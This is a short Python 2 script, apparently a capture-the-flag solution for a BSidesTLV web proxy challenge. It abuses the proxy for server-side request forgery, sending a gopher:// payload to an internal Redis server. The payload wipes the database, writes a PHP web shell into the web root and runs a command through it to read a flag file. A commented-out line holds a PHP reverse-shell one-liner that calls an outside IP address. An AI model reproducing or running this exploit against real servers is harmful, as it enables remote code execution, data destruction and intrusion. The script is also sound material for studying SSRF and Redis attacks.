import urllib
import requests
base = "https://webproxy.ctf.bsidestlv.com/?csurl="
inject_shell = "gopher://192.168.1.2:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A"

# reverse_shell = urllib.quote("php -r '$sock=fsockopen(\"138.68.107.159\",25);exec(\"/bin/bash -i <&3 >&3 2>&3\");'")
reverse_shell = urllib.quote("cat /home/admin/flag.txt")
internal_server = 'http://192.168.1.2/shell.php?cmd=%s' % reverse_shell
try:
    print requests.get(base + urllib.quote(inject_shell), timeout=1).text
except Exception as e:
    print e
finally:
    print requests.get(base + urllib.quote(internal_server), timeout=30).text
